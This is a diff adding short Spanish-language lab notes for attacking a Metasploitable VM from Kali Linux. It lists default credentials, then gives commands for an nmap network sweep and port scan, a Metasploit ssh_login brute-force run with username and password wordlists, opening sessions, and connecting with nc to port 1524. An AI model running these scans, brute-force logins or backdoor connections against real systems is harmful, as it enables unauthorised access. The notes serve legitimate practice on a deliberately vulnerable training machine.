@@ -1,0 +1,35 @@
+Usuarios y Contraseñas para el metasplotaible:
+
+msfadmin 
+msfadmin
+
+En kali liux: 
+
+kali
+kali
+
+en el cmd de kali linux:
+
+ip a
+nmap -sP [la ip que te salio con ip a]/24
+nmap -sT [a algunas de las ips que te salieron]
+
+vamos a metasploit famework:
+
+elegimos el puerto: en este caso utilizaremos ssh:
+use auxiliary/scanner/ssh/ssh_login[ssh_login puede 
+variar segun el puerto]
+set RHOSTS tu ip
+set USER_FILE /home/kali/Desktop/usuarios.txt
+set PASS_FILE /home/kali/Desktop/claves.txt
+set VERBOSE true
+exploit
+sessions -l
+
+para conectarse sessions -i 1
+
+nc [tu ip] [el numero del puerto, en ssh es 22] esto para 
+el puerto 1524
+
+
+
